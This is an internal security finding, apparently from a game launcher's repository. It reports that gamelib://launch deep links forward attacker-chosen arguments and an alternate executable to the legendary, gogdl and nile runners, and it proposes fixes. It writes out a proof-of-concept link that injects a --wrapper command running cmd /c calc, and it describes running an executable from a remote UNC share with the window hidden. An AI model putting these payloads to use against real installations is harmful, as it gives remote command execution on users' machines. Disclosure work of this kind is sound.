---
created: 2026-10-05T00:00:00.000Z
title: "A gamelib://launch deep link passes attacker-chosen arg/altExe into legendary/gogdl/nile CLI options with no confirmation — remote command execution"
area: security
severity: critical
platform: any
ready: code
found_by: "Security review of the webview / sidecar / Rust trust boundary, 2026-10-05"
files:
  - src/backend/protocol.ts:93-102
  - src/backend/protocol.ts:134-170
  - src/backend/storeManagers/legendary/games.ts:996-1008
  - src/backend/storeManagers/legendary/library.ts:851-852
  - src/backend/storeManagers/gog/games.ts:590-592
  - src/backend/storeManagers/gog/games.ts:655-669
  - src/backend/storeManagers/nile/games.ts:401-404
  - src/backend/schemas.ts:4
  - src-tauri/src/main.rs:9500
---

## Problem

The new-style protocol URL reads `arg` (repeatable) and `altExe` from the query string
(`protocol.ts:96-102`) and, for an installed game, hands them to `launchEventCallback` with no
confirmation (the only dialog in the handler is the not-installed install prompt).

- Legendary: `games.ts:1000` joins args with spaces; `library.ts:851` re-splits them with
  `shlex.split` and pushes them straight after `appName` with no `--` separator, so they parse as
  legendary's own options. `altExe` becomes `--override-exe` (`games.ts:1007-1008`).
- gogdl (`gog/games.ts:590-592`, `:655-669`) and nile (`nile/games.ts:401-404`) do the same.
- `Path` (`schemas.ts:4`) accepts any rooted path, including UNC paths.
- The shell's `protocol_url_arg` (`main.rs:9500`) only rejects control characters, oversize URLs
  and non-`gamelib` schemes.

## Failure scenario

The user clicks a link on any web page and accepts the browser's "Open GameLib?" prompt; one game
with a guessable `appName` is installed (e.g. Epic `Fortnite`, a GOG product id).
`gamelib://launch?appName=Fortnite&runner=legendary&arg=--wrapper%20%22cmd%20/c%20calc%22` is split
into legendary options; legendary and gogdl use `parse_known_args`, so `--wrapper`, `--wine`,
`--override-exe` are accepted. On Windows (no app-side `--wrapper` later to override it) that runs
any command. `altExe=\\host\share\x.exe` alone runs an exe from a remote share. `gui=false` hides
the window during the launch.

The orchestrating session confirmed `protocol.ts` and the legendary path by reading them; the
exploit itself was not run.

## Suggested fix

- Stop honouring `arg` and `altExe` from a URL without an explicit in-app confirmation that shows
  the exact executable and arguments (safe default = decline), or drop them from the handler.
- Constrain `altExe` to the game's own listed launch options / files under its install path.
- Insert `--` before passthrough game args in all three runners' command builders so they can
  never be parsed as runner options.
- Note: confirm dialogs on Windows/Linux are only safe once
  `2026-10-05-dialog-dismiss-returns-destructive-button-on-windows-and-linux.md` is fixed.

## Provenance

Found by reading the code; no test was run (the review container had no `node_modules`). The orchestrating session re-checked the cited lines itself and the mechanism holds. Line numbers are as of `5927806` on `main`.
